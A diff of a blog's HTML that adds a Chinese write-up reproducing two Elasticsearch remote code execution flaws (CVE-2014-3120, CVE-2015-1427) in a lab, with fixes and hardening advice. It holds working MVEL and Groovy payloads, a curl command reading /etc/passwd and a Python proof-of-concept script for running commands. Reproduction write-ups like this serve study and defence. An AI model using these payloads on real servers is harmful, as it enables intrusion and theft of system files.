@@ -70,7 +70,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="漏洞复现,">
 
 
 
@@ -83,16 +83,25 @@
 
 
 
-<meta name="description" content="Attitude determines Altitude!">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Louisnie">
-<meta property="og:url" content="https://louisnie.github.io/categories/WEB安全/page/2/index.html">
+<meta name="description" content="只有自己强大优秀，面对真挚的感情时才不会唯唯诺诺。  ElasticSearch 命令执行漏洞（CVE-2014-3120）漏洞简介:Elasticsearch是一个高度可扩展的开源全文搜索和分析引擎。它允许您快速，近实时地存储，搜索和分析大量数据。它通常用作底层引擎/技术，为具有复杂搜索功能和要求的应用程序提供支持。 ElasticSearch其有脚本执行(scripting)的功能，可以很方便">
+<meta name="keywords" content="漏洞复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ElasticSearch命令执行漏洞复现">
+<meta property="og:url" content="https://louisnie.github.io/2019/07/03/elasticsearch命令执行漏洞/index.html">
 <meta property="og:site_name" content="Louisnie">
-<meta property="og:description" content="Attitude determines Altitude!">
+<meta property="og:description" content="只有自己强大优秀，面对真挚的感情时才不会唯唯诺诺。  ElasticSearch 命令执行漏洞（CVE-2014-3120）漏洞简介:Elasticsearch是一个高度可扩展的开源全文搜索和分析引擎。它允许您快速，近实时地存储，搜索和分析大量数据。它通常用作底层引擎/技术，为具有复杂搜索功能和要求的应用程序提供支持。 ElasticSearch其有脚本执行(scripting)的功能，可以很方便">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/HTB1zYVUdQxz61VjSZFr760eLFXak.png">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/HTB1pah8e.GF3KVjSZFo762mpFXaO.png">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/HTB1vBNZe9SD3KVjSZFK76210VXaB.png">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/HTB1eDNLdQxz61VjSZFt761DSVXag.png">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/HTB1CEd7eW1s3KVjSZFA760_ZXXar.png">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/HTB15fN5e8Kw3KVjSZFO761rDVXaV.png">
+<meta property="og:updated_time" content="2019-07-03T10:23:13.776Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Louisnie">
-<meta name="twitter:description" content="Attitude determines Altitude!">
+<meta name="twitter:title" content="ElasticSearch命令执行漏洞复现">
+<meta name="twitter:description" content="只有自己强大优秀，面对真挚的感情时才不会唯唯诺诺。  ElasticSearch 命令执行漏洞（CVE-2014-3120）漏洞简介:Elasticsearch是一个高度可扩展的开源全文搜索和分析引擎。它允许您快速，近实时地存储，搜索和分析大量数据。它通常用作底层引擎/技术，为具有复杂搜索功能和要求的应用程序提供支持。 ElasticSearch其有脚本执行(scripting)的功能，可以很方便">
+<meta name="twitter:image" content="https://ae01.alicdn.com/kf/HTB1zYVUdQxz61VjSZFr760eLFXak.png">
 
 
 
@@ -122,7 +131,7 @@
 
 
 
-  <link rel="canonical" href="https://louisnie.github.io/categories/WEB安全/page/2/">
+  <link rel="canonical" href="https://louisnie.github.io/2019/07/03/elasticsearch命令执行漏洞/">
 
 
 
@@ -131,7 +140,7 @@
 <script src="https://cdn.jsdelivr.net/npm/aplayer@1.7.0/dist/APlayer.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/meting@1.1.0/dist/Meting.min.js"></script>
 
-  <title>分类: WEB安全 | Louisnie</title>
+  <title>ElasticSearch命令执行漏洞复现 | Louisnie</title>
   
 
 
@@ -174,7 +183,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 	
 	<a href="https://github.com/Louisnie/louisnie.github.io" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
@@ -322,57 +331,255 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block category">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>WEB安全<small>分类</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://louisnie.github.io/2019/07/03/elasticsearch命令执行漏洞/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Louisnie">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2018/10/22/5bcd762c46c2c.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Louisnie">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2018/10/23/手动挖掘之默认安装漏洞-1/" itemprop="url">
-              
-                <span itemprop="name">手动挖掘之默认安装漏洞</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">ElasticSearch命令执行漏洞复现</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-10-23T23:15:28+08:00" content="2018-10-23">
-          10-23
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-03T16:01:28+08:00">
+                2019-07-03
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/中间件漏洞/" itemprop="url" rel="index">
+                    <span itemprop="name">中间件漏洞</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1,733 字
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><blockquote class="blockquote-center">只有自己强大优秀，面对真挚的感情时才不会唯唯诺诺。</blockquote></p>
+<p><div class="aplayer" data-id="26418130" data-server="netease" data-type="song" data-mode="single"></div></p>
+<h1 id="ElasticSearch-命令执行漏洞（CVE-2014-3120）"><a href="#ElasticSearch-命令执行漏洞（CVE-2014-3120）" class="headerlink" title="ElasticSearch 命令执行漏洞（CVE-2014-3120）"></a>ElasticSearch 命令执行漏洞（CVE-2014-3120）</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介:"></a>漏洞简介:</h2><p>Elasticsearch是一个高度可扩展的开源全文搜索和分析引擎。它允许您快速，近实时地存储，搜索和分析大量数据。它通常用作底层引擎/技术，为具有复杂搜索功能和要求的应用程序提供支持。</p>
+<p>ElasticSearch其有脚本执行(scripting)的功能，可以很方便地对查询出来的数据再加工处理。但其用的脚本引擎是MVEL，这个引擎没有做任何的防护，或者沙盒包装，所以直接可以执行任意代码。</p>
+<p>而在ElasticSearch里，默认配置是打开动态脚本功能的，因此用户可以直接通过http请求，执行任意代码。</p>
+<p>其实官方是清楚这个漏洞的，在文档里有说明：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">First, you should not run Elasticsearch as the root user, as this would allow a script to access or do anything on your server, without limitations. Second, you should not expose Elasticsearch directly to users, but instead have a proxy application inbetween.</span><br><span class="line"></span><br><span class="line">首先,不应以 root 用户身份运行 Elasticsearch,因为这将允许脚本访问或执行服务器上的任何操作,不受限制。其次,不应直接向用户公开弹性搜索,而应在中间有一个代理应用程序。</span><br></pre></td></tr></table></figure>
+<p>MVEL执行命令的代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">new java.util.Scanner(Runtime.getRuntime().exec(&quot;id&quot;).getInputStream()).useDelimiter(&quot;\\A&quot;).next();</span><br></pre></td></tr></table></figure>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本:"></a>影响版本:</h2><p>ElasticSearch 1.2及其之前的版本</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现:"></a>漏洞复现:</h2><p>首先判断其目标系统存在elasticsearch,其版本为1.1.1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# curl http://192.168.15.130:9200</span><br><span class="line">&#123;</span><br><span class="line">  &quot;status&quot; : 200,</span><br><span class="line">  &quot;name&quot; : &quot;Jack of Hearts&quot;,</span><br><span class="line">  &quot;version&quot; : &#123;</span><br><span class="line">    &quot;number&quot; : &quot;1.1.1&quot;,</span><br><span class="line">    &quot;build_hash&quot; : &quot;f1585f096d3f3985e73456debdc1a0745f512bbc&quot;,</span><br><span class="line">    &quot;build_timestamp&quot; : &quot;2014-04-16T14:27:12Z&quot;,</span><br><span class="line">    &quot;build_snapshot&quot; : false,</span><br><span class="line">    &quot;lucene_version&quot; : &quot;4.7&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;tagline&quot; : &quot;You Know, for Search&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>因为该漏洞需要es中至少存在一条数据，所以我们需要先创建一条数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /website/blog/ HTTP/1.1</span><br><span class="line">Host: 192.168.15.130:9200</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 25</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;phithon&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ae01.alicdn.com/kf/HTB1zYVUdQxz61VjSZFr760eLFXak.png" alt=""></p>
+<p>然后，插入payload去执行代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /_search?pretty HTTP/1.1</span><br><span class="line">Host: 192.168.15.130:9200</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 343</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;size&quot;: 1,</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">      &quot;filtered&quot;: &#123;</span><br><span class="line">        &quot;query&quot;: &#123;</span><br><span class="line">          &quot;match_all&quot;: &#123;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;script_fields&quot;: &#123;</span><br><span class="line">        &quot;command&quot;: &#123;</span><br><span class="line">            &quot;script&quot;: &quot;import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\&quot;id\&quot;).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next();&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ae01.alicdn.com/kf/HTB1pah8e.GF3KVjSZFo762mpFXaO.png" alt=""></p>
+<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>1.关掉执行脚本功能，在配置文件elasticsearch.yml里为每一个结点都加上：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script.disable_dynamic: <span class="keyword">true</span></span><br></pre></td></tr></table></figure>
+<p>2.升级到最新系统</p>
+<h1 id="ElasticSearch-Groovy-沙盒绕过-amp-amp-代码执行漏洞（CVE-2015-1427）"><a href="#ElasticSearch-Groovy-沙盒绕过-amp-amp-代码执行漏洞（CVE-2015-1427）" class="headerlink" title="ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）"></a>ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）</h1><h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景:"></a>漏洞背景:</h2><p>在2014年爆出的(CVE-2014-3120)漏洞，漏洞产生的原因是由于搜索引擎支持使用脚本代码(MVEL)作为表达式进行数据操作，攻击者可以通过MVEL构造执行任意Java代码，后来脚本语言引擎换成了Groovy，并且加入了沙盒进行控制，危险的代码会被拦截，结果这次由于沙盒限制的不严格，导致远程代码执行,也即是我们这次复现的漏洞:ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）。</p>
+<h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本:"></a>影响版本:</h2><p>影响版本是Elasticsearch 1.3.0-1.3.7 和 1.4.0-1.4.2 的Groovy 脚本引擎存在漏洞。</p>
+<p>这个漏洞允许攻击者构造Groovy脚本绕过沙箱检查执行shell命令。</p>
+<p>目前已修复的版本是Elasticsearch 1.3.8 和 1.4.3，建议用户更新到最新版本。</p>
+<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现:"></a>漏洞复现:</h2><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路:"></a>攻击思路:</h3><p>ElasticSearch支持使用“在沙盒中的”Groovy语言作为动态脚本，但显然官方的工作并没有做好。lupin和tang3分别提出了两种执行命令的方法：</p>
+<ol>
+<li>既然对执行Java代码有沙盒，lupin的方法是想办法绕过沙盒，比如使用Java反射</li>
+<li>Groovy原本也是一门语言，于是tang3另辟蹊径，使用Groovy语言支持的方法，来直接执行命令，无需使用Java语言</li>
+</ol>
+<p>所以，根据这两种执行漏洞的思路，我们可以获得两个不同的POC。</p>
+<p>Java沙盒绕过法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Math.class.forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;id&quot;).getText()</span><br></pre></td></tr></table></figure>
+<p>Goovy直接执行命令法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def command=&apos;id&apos;;def res=command.execute().text;res</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试:"></a>漏洞测试:</h3><p>首先先判断目标系统的elasticsearch是否可以正常访问</p>
+<p><img src="https://ae01.alicdn.com/kf/HTB1vBNZe9SD3KVjSZFK76210VXaB.png" alt=""></p>
+<p>由于查询时至少要求es中有一条数据，所以我们发送如下数据包，增加一个数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /website/blog/ HTTP/1.1</span><br><span class="line">Host: 192.168.15.130:9200</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 25</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;test&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ae01.alicdn.com/kf/HTB1eDNLdQxz61VjSZFt761DSVXag.png" alt=""></p>
+<p>然后发送包含payload的数据包，执行任意命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /_search?pretty HTTP/1.1</span><br><span class="line">Host: 192.168.15.130:9200</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/text</span><br><span class="line">Content-Length: 156</span><br><span class="line"></span><br><span class="line">&#123;&quot;size&quot;:1, &quot;script_fields&quot;: &#123;&quot;lupin&quot;:&#123;&quot;lang&quot;:&quot;groovy&quot;,&quot;script&quot;: &quot;java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;id\&quot;).getText()&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ae01.alicdn.com/kf/HTB1CEd7eW1s3KVjSZFA760_ZXXar.png" alt=""></p>
+<p>也可以使用火狐的插件hackbar去发送post数据包实现命令执行</p>
+<p><img src="https://ae01.alicdn.com/kf/HTB15fN5e8Kw3KVjSZFO761rDVXaV.png" alt=""></p>
+<p>或者使用curl去发送数据包实现命令执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -XPOST http://ip:9200/_search?pretty=true -d &apos;&#123;&quot;size&quot;:1,&quot;script_fields&quot;: &#123;&quot;test#&quot;: &#123;&quot;script&quot;:&quot;java.lang.Math.class.forName(\&quot;java.io.BufferedReader\&quot;).getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\&quot;java.io.InputStreamReader\&quot;).getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;cat /etc/passwd\&quot;).getInputStream())).readLines()&quot;,&quot;lang&quot;: &quot;groovy&quot;&#125;&#125;&#125;&apos;</span><br></pre></td></tr></table></figure>
+<p>​        python编写的POC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#-*-coding:utf-8-*-</span><br><span class="line">import urllib</span><br><span class="line">import urllib2</span><br><span class="line">import json</span><br><span class="line">import sys</span><br><span class="line">def execute(url,command):</span><br><span class="line">parameters = &#123;</span><br><span class="line">                &quot;size&quot;:1,</span><br><span class="line">                &quot;script_fields&quot;:</span><br><span class="line">                &#123;&quot;iswin&quot;:</span><br><span class="line">                        &#123;</span><br><span class="line">                            &quot;script&quot;:&quot;java.lang.Math.class.forName(\&quot;java.io.BufferedReader\&quot;).getConstructor(java.io.Reader.class).\newInstance(java.lang.Math.class.forName(\&quot;java.io.InputStreamReader\&quot;).getConstructor(java.io.InputStream.\class).newInstance(java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;%s\&quot;).\getInputStream())).readLines()&quot; % command,</span><br><span class="line">                            &quot;lang&quot;: &quot;groovy&quot;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">data = json.dumps(parameters)</span><br><span class="line">try:</span><br><span class="line">    request=urllib2.Request(url+&quot;_search?pretty&quot;,data)</span><br><span class="line">    request.add_header(&apos;User-Agent&apos;, &apos;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36&apos;)</span><br><span class="line">    response=urllib2.urlopen(request)</span><br><span class="line">    result = json.loads(response.read())[&quot;hits&quot;][&quot;hits&quot;][0][&quot;fields&quot;][&quot;iswin&quot;][0]</span><br><span class="line">for i in result:</span><br><span class="line">    print i</span><br><span class="line">except Exception, e:</span><br><span class="line">    print e</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    if len(sys.argv) != 3:</span><br><span class="line">        print &quot;usage %s url command&quot; % sys.argv[0]</span><br><span class="line">    else:</span><br><span class="line">        execute(sys.argv[1],sys.argv[2])</span><br></pre></td></tr></table></figure>
+<p>用法:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python Elasticsearch.py target ifconfig</span><br><span class="line">python Elasticsearch.py target &apos;uname -a&apos;</span><br></pre></td></tr></table></figure>
+<h2 id="修复方法-1"><a href="#修复方法-1" class="headerlink" title="修复方法:"></a>修复方法:</h2><p>关闭groovy沙盒以已停止动态脚本的使用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script.groovy.sandbox.enabled: false</span><br></pre></td></tr></table></figure>
+<h3 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议:"></a>安全建议:</h3><ul>
+<li>elasticsearch禁止向外网开放</li>
+<li>elasticsearch在启动的时候以非root用户启动.</li>
+<li>如果业务需要外网开放时,增加严格权限验证</li>
+<li>关注官方动态,使用最新版本</li>
+</ul>
 
       
     </div>
+    
+    
+    
 
+    
+
+    
+
+    
+	
+	    <div>
+     
+     <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+        </div>
+	
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/漏洞复现/" rel="tag"><i class="fa fa-tag"></i> 漏洞复现</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/02/jumpserver/" rel="next" title="JumpServer运维堡垒机安装及实战">
+                <i class="fa fa-chevron-left"></i> JumpServer运维堡垒机安装及实战
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
-
-  
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/categories/WEB安全/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/categories/WEB安全/">1</a><span class="page-number current">2</span>
-  </nav>
+  </article>
 
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -380,6 +587,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -400,8 +611,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -418,7 +638,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-count">22</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -588,6 +808,22 @@ show_date_time();
       </section>
 
       
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ElasticSearch-命令执行漏洞（CVE-2014-3120）"><span class="nav-number">1.</span> <span class="nav-text">ElasticSearch 命令执行漏洞（CVE-2014-3120）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞简介"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞简介:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#影响版本"><span class="nav-number">1.2.</span> <span class="nav-text">影响版本:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞复现"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞复现:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#修复方法"><span class="nav-number">1.4.</span> <span class="nav-text">修复方法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ElasticSearch-Groovy-沙盒绕过-amp-amp-代码执行漏洞（CVE-2015-1427）"><span class="nav-number">2.</span> <span class="nav-text">ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞背景"><span class="nav-number">2.1.</span> <span class="nav-text">漏洞背景:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#影响版本-1"><span class="nav-number">2.2.</span> <span class="nav-text">影响版本:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞复现-1"><span class="nav-number">2.3.</span> <span class="nav-text">漏洞复现:</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击思路"><span class="nav-number">2.3.1.</span> <span class="nav-text">攻击思路:</span></a></li><li 